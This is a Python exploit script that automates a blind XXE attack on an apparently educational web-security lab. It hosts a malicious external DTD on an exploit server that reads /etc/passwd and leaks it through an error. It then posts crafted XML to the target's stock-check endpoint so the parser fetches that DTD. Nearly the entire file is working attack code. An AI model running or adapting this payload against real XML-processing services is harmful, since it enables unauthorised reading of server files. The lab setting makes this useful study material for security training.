import requests
import re
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.exploit_server_url = None
        self.session = requests.Session()

    def get_exploit_server_url(self):
        response = self.session.get(self.lab_url)
        self.exploit_server_url = re.search(r'(https://exploit-.*?)\'', response.text).group(1)

    def upload_external_dtd_to_server(self):
        payload = '''<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'file///ma4747gh/%file;'>">
%eval;
%exfiltrate;'''.format(self.exploit_server_url)
        data = {
            'urlIsHttps': 'on',
            'responseFile': '/exploit',
            'responseHead': 'HTTP/1.1 200 OK\r\nContent-Type: text/plain; charset=utf-8',
            'responseBody': payload,
            'formAction': 'STORE'
        }

        self.session.post(self.exploit_server_url, data=data)

    def get_etc_passwd(self):
        payload = '''<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{}"> %xxe;]>
    <stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>'''.format(self.exploit_server_url + '/exploit')
        headers = {
            'Content-Type': 'text/xml',
        }
        response = self.session.post(self.lab_url + 'product/stock', data=payload, headers=headers)
        print(response.text)

    def check_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.get_exploit_server_url()
        self.upload_external_dtd_to_server()
        self.get_etc_passwd()
        self.check_solution()


solver = LabSolver(sys.argv[1])
solver.solve()
